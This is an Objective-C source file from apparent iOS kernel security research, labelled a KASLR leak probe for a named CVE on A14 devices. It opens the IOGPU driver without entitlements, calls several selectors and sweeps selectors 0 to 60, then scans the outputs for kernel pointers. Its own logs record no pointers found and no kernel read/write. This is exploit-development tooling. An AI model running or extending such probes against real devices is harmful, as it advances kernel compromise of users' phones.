//
//  P010QueueLeak.m
//  P007OpenOnly
//
//  P010 v7: CVE-2026-64760 KASLR leak — IOGPU selector output dump
//  Uses IOGPUDeviceCreate (T014 path — no entitlement needed, works on free account)
//  Dumps ALL output bytes from every IOGPU selector, scans for kernel pointers.
//

#import "P010QueueLeak.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabIOGPUQueue.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <stdarg.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

// IOKit via dlopen (no public headers on iOS SDK)
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOServiceOpen_t)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

// IOGPU.framework functions
typedef void *(*DevCreate_t)(io_service_t);
typedef uint32_t (*GetConn_t)(void *);
typedef void (*DevRelease_t)(void *);

static FILE *p010_fp;
static NSMutableString *p010_buf;

static void p010_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p010_log(NSString *fmt, ...) {
    if (!p010_buf) p010_buf = [NSMutableString string];
    if (!p010_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:
                          @"p010_queue_leak_log.txt"];
        p010_fp = fopen(path.UTF8String, "w");
        if (p010_fp) {
            setvbuf(p010_fp, NULL, _IOLBF, 0);
            fprintf(p010_fp, "=== p010 v7 session %s (CVE-2026-64760) ===\n",
                    [[NSDate date] description].UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [p010_buf appendFormat:@"%@\n", msg];
    if (p010_fp) {
        fprintf(p010_fp, "%s\n", msg.UTF8String);
        fflush(p010_fp);
    }
    NSLog(@"p010 %@", msg);
}

static const char *p010_kr(kern_return_t r) {
    unsigned u = (unsigned)r;
    if (r == 0) return "SUCCESS";
    if (u == 0xe00002c2) return "BadArgument";
    if (u == 0xe00002be) return "NoResources";
    if (u == 0xe00002c7) return "NotPrivileged";
    if (u == 0xe00002e2) return "NotPermitted";
    if (u == 0xe00002cc) return "NoSpace";
    if (u == 0x10000003) return "MIG_SEND_INVALID_DEST";
    return "?";
}

// Check if a value looks like a kernel pointer
// A14 arm64e kernel pointers:
//   0xFFFFFFF0XXXXXXXX — kernel text/data (slide-dependent)
//   0xFFFFFFF1XXXXXXXX — kernel heap
//   0xFFFFFFE5XXXXXXXX — kernel heap (alt range)
//   0xFFFFFFF2XXXXXXXX — kernel PPL
// PAC'd pointers: top 16 bits may be signature, strip and re-check
static int p010_is_kptr(uint64_t val) {
    // Direct kernel pointer ranges
    if (val >= 0xFFFFFFF000000000ULL && val <= 0xFFFFFFF1FFFFFFFFULL) return 1;
    if (val >= 0xFFFFFFE500000000ULL && val <= 0xFFFFFFE5FFFFFFFFULL) return 1;
    if (val >= 0xFFFFFFF200000000ULL && val <= 0xFFFFFFF2FFFFFFFFULL) return 1;
    // PAC'd: strip top 16 bits, check if lower 48 bits are in kernel range
    uint64_t stripped = val & 0x0000FFFFFFFFFFFFULL;
    if (stripped >= 0xFFFFFFF000000000ULL && stripped <= 0xFFFFFFF2FFFFFFFFULL) return 1;
    if (stripped >= 0xFFFFFFE500000000ULL && stripped <= 0xFFFFFFE5FFFFFFFFULL) return 1;
    // Also check: if top byte is 0xFF and bits 47-40 are in kernel range
    if ((val >> 56) == 0xFF) {
        uint8_t bits47_40 = (val >> 40) & 0xFF;
        if (bits47_40 >= 0xE5 && bits47_40 <= 0xF2) return 1;
    }
    return 0;
}

// Dump a buffer as hex + scan for kptrs
static int p010_dump_and_scan(const void *p, size_t len, const char *tag) {
    if (!p || len == 0) return 0;
    int hits = 0;
    const uint8_t *buf = (const uint8_t *)p;

    // Hex dump (first 256 bytes max)
    size_t dump_len = len > 256 ? 256 : len;
    p010_log(@"  [%s] dump (%zu bytes, showing %zu):", tag, len, dump_len);
    for (size_t i = 0; i < dump_len; i += 16) {
        NSString *line = [NSString stringWithFormat:@"    +0x%04zx:", i];
        for (size_t j = 0; j < 16 && i + j < dump_len; j++) {
            line = [line stringByAppendingFormat:@" %02x", buf[i + j]];
        }
        p010_log(@"%@", line);
    }

    // Scan for kernel pointers (8-byte aligned)
    for (size_t i = 0; i + 8 <= len; i += 8) {
        uint64_t val;
        memcpy(&val, buf + i, 8);
        if (p010_is_kptr(val)) {
            p010_log(@"  [%s] +0x%04zx: 0x%016llx *** KPTR ***",
                tag, i, (unsigned long long)val);
            hits++;
        }
    }

    // Also scan unaligned (catches structs where kptr is at odd offset)
    for (size_t i = 1; i + 8 <= len && i < 128; i++) {
        if (i % 8 == 0) continue; // already checked above
        uint64_t val;
        memcpy(&val, buf + i, 8);
        if (p010_is_kptr(val)) {
            p010_log(@"  [%s] +0x%04zx (unaligned): 0x%016llx *** KPTR ***",
                tag, i, (unsigned long long)val);
            hits++;
        }
    }

    return hits;
}

// Dump scalar outputs
static int p010_dump_scalars(const uint64_t *sc, uint32_t cnt, const char *tag) {
    int hits = 0;
    for (uint32_t i = 0; i < cnt && i < 16; i++) {
        p010_log(@"  [%s] scalar[%u] = 0x%016llx%s",
            tag, i, (unsigned long long)sc[i],
            p010_is_kptr(sc[i]) ? " *** KPTR ***" : "");
        if (p010_is_kptr(sc[i])) hits++;
    }
    return hits;
}

static NSString *p010_finish(void) {
    if (p010_fp) { fflush(p010_fp); fclose(p010_fp); p010_fp = NULL; }
    return p010_buf.length ? p010_buf : @"(no p010 log)";
}

@implementation P010QueueLeak

+ (NSString *)tap {
    if (p010_fp) { fclose(p010_fp); p010_fp = NULL; }
    p010_buf = [NSMutableString string];
    p010_log(@"========================================");
    p010_log(@"p010 v8: 26.5 / 23F77 QueueCreate copyout diagnostic");
    p010_log(@"sku: %@", [LabDeviceProfile banner]);
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010qleak"];
    if (stop) {
        p010_log(@"%@", stop);
        return p010_finish();
    }
    p010_log(@"A14 pins: create sel=%u stIn=0x%x word1=+0x%x  destroy sel=%u  submit sel=%u  SysMem MD +0x%x",
             [LabDeviceProfile queueCreateSel], [LabDeviceProfile queueCreateSize],
             [LabDeviceProfile queueLeakOff], [LabDeviceProfile queueDestroySel],
             [LabDeviceProfile queueSubmitSel], [LabDeviceProfile sysmemMdOff]);
    p010_log(@"expect: %@ ", [LabDeviceProfile expectQueueCreate]);
    p010_log(@"FKT twin: 21D50 word1 was +0x550. Do not paste +0x550. NOT KRW.");
    p010_log(@"2026-09-02 device: sel=6 0x410 SUCCESS; word1 ~0x9012134 not-kptr; 0 kptrs.");
    p010_log(@"sel=5/8/23/36/49 BadArgument is expected. Reconfirm of 2026-08-31. Not K.");
    p010_log(@"========================================");

    int total_hits = 0;
    uint32_t qid = 0;

    // ================================================================
    // Setup: Load IOKit + IOGPU frameworks
    // ================================================================
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) {
        p010_log(@"STOP: IOKit dlopen failed");
        return p010_finish();
    }

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) {
        p010_log(@"STOP: IOGPU.framework dlopen failed");
        return p010_finish();
    }

    IOServiceMatching_t pMatching = (IOServiceMatching_t)dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = (IOServiceGetMatchingService_t)dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = (IOObjectRelease_t)dlsym(iokit, "IOObjectRelease");
    IOServiceOpen_t pOpen = (IOServiceOpen_t)dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = (IOServiceClose_t)dlsym(iokit, "IOServiceClose");
    IOConnectCallMethod_t pCall = (IOConnectCallMethod_t)dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = (mach_port_t *)dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = (mach_port_t *)dlsym(iokit, "kIOMasterPortDefault");

    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");

    if (!pMatching || !pGet || !pRelease || !pCall || !pMainPort) {
        p010_log(@"STOP: dlsym failed for required symbols");
        return p010_finish();
    }

    // ================================================================
    // Setup: Get IOGPU connection via IOGPUDeviceCreate
    // (Works on free account — no entitlement needed)
    // ================================================================
    p010_log(@"");
    p010_log(@"=== Setup: Get IOGPU connection ===");

    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) {
        p010_log(@"STOP: IOGPU service not found");
        return p010_finish();
    }
    p010_log(@"IOGPU service=%u", svc);

    void *dev = NULL;
    mach_port_t conn = MACH_PORT_NULL;
    BOOL openedRaw = NO;
    if (pDevCreate) {
        dev = pDevCreate(svc);
        p010_log(@"IOGPUDeviceCreate -> %p", dev);
        if (dev && pGetConn) {
            conn = pGetConn(dev);
            p010_log(@"IOGPUDeviceGetConnect -> %u", (unsigned)conn);
        }
    }
    if ((!conn || conn == MACH_PORT_NULL) && pOpen) {
        kern_return_t okr = pOpen(svc, mach_task_self(), 1, &conn);
        p010_log(@"IOServiceOpen(type=1) kr=%s conn=%u", p010_kr(okr), (unsigned)conn);
        if (okr != KERN_SUCCESS) conn = MACH_PORT_NULL;
        else openedRaw = YES;
    }
    if (!conn || conn == MACH_PORT_NULL) {
        p010_log(@"STOP: no IOGPU connection");
        pRelease(svc);
        return p010_finish();
    }
    p010_log(@"IOGPU conn=%u", (unsigned)conn);

    uint32_t typeId = 0;
    if (dev) typeId = *(uint32_t *)((uint8_t *)dev + 0x08) & 0xff;
    p010_log(@"typeId=%u createSel=%u prefer stIn=0x%x",
             typeId, [LabDeviceProfile queueCreateSel],
             [LabDeviceProfile queueCreateSize]);

    // ================================================================
    // Phase A: sel=6 QueueCreate — dump ALL output
    // ================================================================
    p010_log(@"");
    p010_log(@"=== A. QueueCreate sel=%u stIn sweep (A14 0x410) ===",
             [LabDeviceProfile queueCreateSel]);

    {
        uint32_t used = 0;
        uint64_t w0 = 0, w1 = 0;
        kern_return_t r = [LabIOGPUQueue sweepCreateWithCall:pCall
                                                        conn:conn
                                                      typeId:typeId
                                                    usedSize:&used
                                                       word0:&w0
                                                       word1:&w1
                                                         log:^(NSString *line) {
            p010_log(@"%@", line);
        }];
        uint64_t outSc[8] = { w0, w1 };
        uint32_t outScCnt = 2;
        uint8_t outSt[16];
        memset(outSt, 0, sizeof(outSt));
        memcpy(outSt, &w0, 8);
        memcpy(outSt + 8, &w1, 8);
        size_t outStSz = 16;
        p010_log(@"sel=%u kr=%s used=0x%x word0=0x%llx word1=0x%llx  FIELD# +0x%x %s",
                 [LabDeviceProfile queueCreateSel], p010_kr(r), used,
                 (unsigned long long)w0, (unsigned long long)w1,
                 [LabDeviceProfile queueLeakOff],
                 [LabIOGPUQueue wordLooksLikeKptr:w1] ? "word1 KPTR-SHAPED" : "word1 not-kptr (expected)");

        if (r == 0) {
            // Dump scalar outputs
            total_hits += p010_dump_scalars(outSc, outScCnt, "sel6-scalar");
            total_hits += p010_dump_and_scan(outSt, outStSz, "sel6-struct");

            // Extract qid
            qid = (uint32_t)w0;
            p010_log(@"qid=%u", qid);

            // ================================================================
            // Phase B: sel=5 Clock — stOut=16, NEVER TESTED
            // ================================================================
            p010_log(@"");
            p010_log(@"=== B. sel=5 Clock (stOut=16) ===");

            {
                uint8_t clkOut[0x100];
                size_t clkOutSz = sizeof(clkOut);
                uint64_t clkSc[8] = {0};
                uint32_t clkScCnt = 8;

                kern_return_t cr = pCall(conn, 5,
                                         NULL, 0, NULL, 0,
                                         clkSc, &clkScCnt,
                                         clkOut, &clkOutSz);
                p010_log(@"sel=5 kr=%s outScCnt=%u outStSz=%zu",
                    p010_kr(cr), clkScCnt, clkOutSz);

                if (cr == 0) {
                    total_hits += p010_dump_scalars(clkSc, clkScCnt, "sel5-scalar");
                    if (clkOutSz > 0) {
                        total_hits += p010_dump_and_scan(clkOut, clkOutSz, "sel5-struct");
                    }
                }
            }

            // ================================================================
            // Phase C: sel=23 Thunk — scOut=1
            // ================================================================
            p010_log(@"");
            p010_log(@"=== C. sel=23 Thunk (scOut=1) ===");

            {
                uint64_t thunkSc[8] = {0};
                uint32_t thunkScCnt = 8;
                uint8_t thunkSt[0x100];
                size_t thunkStSz = sizeof(thunkSt);

                kern_return_t tr = pCall(conn, 23,
                                         NULL, 0, NULL, 0,
                                         thunkSc, &thunkScCnt,
                                         thunkSt, &thunkStSz);
                p010_log(@"sel=23 kr=%s outScCnt=%u outStSz=%zu",
                    p010_kr(tr), thunkScCnt, thunkStSz);

                if (tr == 0) {
                    total_hits += p010_dump_scalars(thunkSc, thunkScCnt, "sel23-scalar");
                    if (thunkStSz > 0) {
                        total_hits += p010_dump_and_scan(thunkSt, thunkStSz, "sel23-struct");
                    }
                }
            }

            // ================================================================
            // Phase D: sel=8 NewResource
            // ================================================================
            p010_log(@"");
            p010_log(@"=== D. sel=8 NewResource ===");

            {
                // From A14_23F77_LabOffsets.h: res type 0x80, size 0x4000
                uint64_t inSc[] = { 0x80, 0x4000, 0, 0 };
                uint8_t inSt[0x100];
                memset(inSt, 0, sizeof(inSt));

                uint64_t resSc[8] = {0};
                uint32_t resScCnt = 8;
                uint8_t resSt[0x200];
                size_t resStSz = sizeof(resSt);

                // Try scalar input
                kern_return_t rr = pCall(conn, A14_23F77_IOGPU_NEW_RESOURCE_SEL,
                                         inSc, 4, NULL, 0,
                                         resSc, &resScCnt,
                                         resSt, &resStSz);
                p010_log(@"sel=8 (scIn=4) kr=%s outScCnt=%u outStSz=%zu",
                    p010_kr(rr), resScCnt, resStSz);

                if (rr == 0) {
                    total_hits += p010_dump_scalars(resSc, resScCnt, "sel8-scalar");
                    if (resStSz > 0) {
                        total_hits += p010_dump_and_scan(resSt, resStSz, "sel8-struct");
                    }
                }

                // Try with struct input
                resScCnt = 8;
                resStSz = sizeof(resSt);
                rr = pCall(conn, A14_23F77_IOGPU_NEW_RESOURCE_SEL,
                           NULL, 0, inSt, 0x80,
                           resSc, &resScCnt,
                           resSt, &resStSz);
                p010_log(@"sel=8 (stIn=0x80) kr=%s outScCnt=%u outStSz=%zu",
                    p010_kr(rr), resScCnt, resStSz);

                if (rr == 0) {
                    total_hits += p010_dump_scalars(resSc, resScCnt, "sel8-st-scalar");
                    if (resStSz > 0) {
                        total_hits += p010_dump_and_scan(resSt, resStSz, "sel8-st-struct");
                    }
                }
            }

            // ================================================================
            // Phase E: sel=36 Holder — scIn=3, scOut=1
            // ================================================================
            p010_log(@"");
            p010_log(@"=== E. sel=36 Holder (scIn=3, scOut=1) ===");

            {
                // sel=36 needs {id, off, len} — use qid, offset=0, len=0x1000
                uint64_t inSc36[] = { qid, 0, A14_23F77_IOGPU_SEL36_LEN };
                uint64_t hSc[8] = {0};
                uint32_t hScCnt = 8;
                uint8_t hSt[0x200];
                size_t hStSz = sizeof(hSt);

                kern_return_t hr = pCall(conn, A14_23F77_IOGPU_SEL36,
                                         inSc36, A14_23F77_IOGPU_SEL36_SCIN,
                                         NULL, 0,
                                         hSc, &hScCnt,
                                         hSt, &hStSz);
                p010_log(@"sel=36 kr=%s outScCnt=%u outStSz=%zu",
                    p010_kr(hr), hScCnt, hStSz);

                if (hr == 0) {
                    total_hits += p010_dump_scalars(hSc, hScCnt, "sel36-scalar");
                    if (hStSz > 0) {
                        total_hits += p010_dump_and_scan(hSt, hStSz, "sel36-struct");
                    }
                }
            }

            // ================================================================
            // Phase F: sel=49 perform_io — scIn=1
            // ================================================================
            p010_log(@"");
            p010_log(@"=== F. sel=49 perform_io (scIn=1) ===");

            {
                uint64_t inSc49[] = { qid };
                uint64_t pSc[8] = {0};
                uint32_t pScCnt = 8;
                uint8_t pSt[0x200];
                size_t pStSz = sizeof(pSt);

                kern_return_t pr = pCall(conn, 49,
                                         inSc49, 1, NULL, 0,
                                         pSc, &pScCnt,
                                         pSt, &pStSz);
                p010_log(@"sel=49 kr=%s outScCnt=%u outStSz=%zu",
                    p010_kr(pr), pScCnt, pStSz);

                if (pr == 0) {
                    total_hits += p010_dump_scalars(pSc, pScCnt, "sel49-scalar");
                    if (pStSz > 0) {
                        total_hits += p010_dump_and_scan(pSt, pStSz, "sel49-struct");
                    }
                }
            }

            // ================================================================
            // Phase G: Sweep selectors 0-60 with empty input
            // ================================================================
            p010_log(@"");
            p010_log(@"=== G. Selector sweep 0-60 (empty input) ===");

            {
                for (uint32_t sel = 0; sel <= 60; sel++) {
                    // Skip already-tested selectors
                    if (sel == 5 || sel == 6 || sel == 7 || sel == 8 ||
                        sel == 23 || sel == 25 || sel == 36 || sel == 49) continue;

                    uint64_t sc[8] = {0};
                    uint32_t scCnt = 8;
                    uint8_t st[0x200];
                    size_t stSz = sizeof(st);

                    kern_return_t r = pCall(conn, sel,
                                            NULL, 0, NULL, 0,
                                            sc, &scCnt, st, &stSz);
                    if (r == 0 && (scCnt > 0 || stSz > 0)) {
                        p010_log(@"sel=%u OK outSc=%u outSt=%zu",
                            sel, scCnt, stSz);
                        int hits = 0;
                        hits += p010_dump_scalars(sc, scCnt,
                            [NSString stringWithFormat:@"sel%u-scalar", sel].UTF8String);
                        if (stSz > 0) {
                            hits += p010_dump_and_scan(st, stSz,
                                [NSString stringWithFormat:@"sel%u-struct", sel].UTF8String);
                        }
                        if (hits > 0) {
                            p010_log(@"  *** SEL=%u KPTR HITS: %d ***", sel, hits);
                            total_hits += hits;
                        }
                    }
                }
            }

            // ================================================================
            // Phase H: sel=6 repeated calls — check for stale kptrs
            // ================================================================
            p010_log(@"");
            p010_log(@"=== H. Repeated QueueCreate (stale kptr check) ===");

            {
                for (int i = 0; i < 5; i++) {
                    uint32_t insz = [LabDeviceProfile queueCreateSize];
                    uint64_t a = 0, b = 0;
                    size_t osz = 16;
                    kern_return_t r = [LabIOGPUQueue createWithCall:pCall
                                                               conn:conn
                                                             typeId:typeId
                                                             inSize:insz
                                                              word0:&a
                                                              word1:&b
                                                             outCnt:&osz];
                    uint64_t sc[8] = { a, b };
                    uint32_t scCnt = 2;
                    uint8_t st[16];
                    memset(st, 0, sizeof(st));
                    memcpy(st, &a, 8);
                    memcpy(st + 8, &b, 8);
                    size_t stSz = 16;
                    if (r == 0) {
                        p010_log(@"  queue[%d]: outSc=%u outSt=%zu",
                            i, scCnt, stSz);
                        // Dump all words
                        for (uint32_t j = 0; j < scCnt && j < 8; j++) {
                            p010_log(@"    scalar[%u] = 0x%016llx%s",
                                j, (unsigned long long)sc[j],
                                p010_is_kptr(sc[j]) ? " *** KPTR ***" : "");
                            if (p010_is_kptr(sc[j])) total_hits++;
                        }
                        if (stSz > 0) {
                            total_hits += p010_dump_and_scan(st, stSz,
                                [NSString stringWithFormat:@"queue%d", i].UTF8String);
                        }
                    } else {
                        p010_log(@"  queue[%d]: FAIL 0x%x", i, (unsigned)r);
                    }
                }
            }

            // Cleanup: destroy queue
            {
                if (qid) {
                    uint64_t destroySc[] = { qid };
                    pCall(conn, [LabDeviceProfile queueDestroySel], destroySc, 1,
                          NULL, 0, NULL, NULL, NULL, NULL);
                    p010_log(@"queue %u destroyed via sel=%u", qid,
                             [LabDeviceProfile queueDestroySel]);
                }
            }
        } else {
            p010_log(@"sel=6 FAILED — cannot proceed with dependent tests");
        }
    }

    // Cleanup: release device + service
    {
        if (openedRaw && pClose && conn) pClose(conn);
        if (dev && pDevRelease) pDevRelease(dev);
        if (svc && pRelease) pRelease(svc);
    }

    // ================================================================
    // Summary
    // ================================================================
    p010_log(@"");
    p010_log(@"=== SUMMARY ===");
    p010_log(@"total kernel pointer hits: %d", total_hits);
    p010_log(@"word1 is *(CommandQueue+0x%x) on 23F77. Device 2026-08-31 + FKT 0.6.1: not kptr.",
             [LabDeviceProfile queueLeakOff]);
    if (total_hits > 0)
        p010_log(@"kptr-shaped words in SOME selector output — classify, do not treat word1 as slide.");
    else
        p010_log(@"No kernel pointers in IOGPU selector outputs. P010 stays ABI leak of a queue field, not KASLR.");
    p010_log(@"NOT KRW. Do not paste 21D50 +0x550.");

    return p010_finish();
}

@end
